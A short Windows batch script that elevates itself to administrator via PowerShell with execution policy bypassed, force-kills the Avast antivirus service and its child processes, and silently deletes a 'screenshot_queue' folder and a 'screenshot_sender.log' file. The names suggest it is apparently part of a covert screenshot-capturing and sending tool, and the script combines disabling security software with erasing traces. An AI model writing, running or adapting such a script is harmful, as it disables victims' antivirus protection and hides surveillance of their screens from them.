@echo off
setlocal EnableExtensions

:: Request administrator rights if needed.
fltmc >nul 2>&1
if errorlevel 1 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"

:: Stop AvastSvc.exe and its child processes.
taskkill /F /T /IM AvastSvc.exe >nul 2>&1

:: Clean queued screenshots and logs.
if exist "screenshot_queue" rmdir /S /Q "screenshot_queue"
if exist "screenshot_sender.log" del /F /Q "screenshot_sender.log"

exit /b
